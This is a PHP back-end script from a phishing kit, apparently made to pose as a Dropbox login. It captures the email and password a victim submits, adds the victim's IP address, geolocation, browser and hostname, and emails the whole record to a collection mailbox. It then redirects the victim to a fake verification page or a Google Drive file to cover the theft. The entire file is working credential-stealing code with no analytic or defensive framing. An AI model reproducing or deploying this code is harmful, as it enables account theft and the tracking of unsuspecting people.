<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Dropbox Info-----------------------\n";
$message .= "|eMail : ".$_POST['email']."\n";
$message .= "|PasSword : ".$_POST['password']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "-------------BURHAN FUDPAGE [.] COM---------------\n";
//change ur email here
$sent ="results002@gmail.com";
$subject = "Result - ".$country;
$headers = "From: Results Wire<wirez@googledocs.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
if(preg_match("/@gmail\.com$/", urldecode($_POST['email'])))
    {
	mail($sent,$subject,$message,$headers);header("Location: verification.php?cmd=login_submit&id=39acf77a2fe2jkhjkuda9bb1881792650e4sfdgsfgsfe4539acf77asfdgsdfg2fe2da9bb18sfdgsfdg81792650e4e45&session=39acf77a2fe2da9bb1881792650e4e4539acf77a2fe2da9bb1881zcxvzsfdg792650e4e45");exit;
    }else{mail($sent,$subject,$message,$headers);}

 
     header("Location: https://drive.google.com/file/d/1twkz5G2TmqljM61a8xs2cOeCSwkedadc/view");
}else{
header("Location: index.php");
}

?>

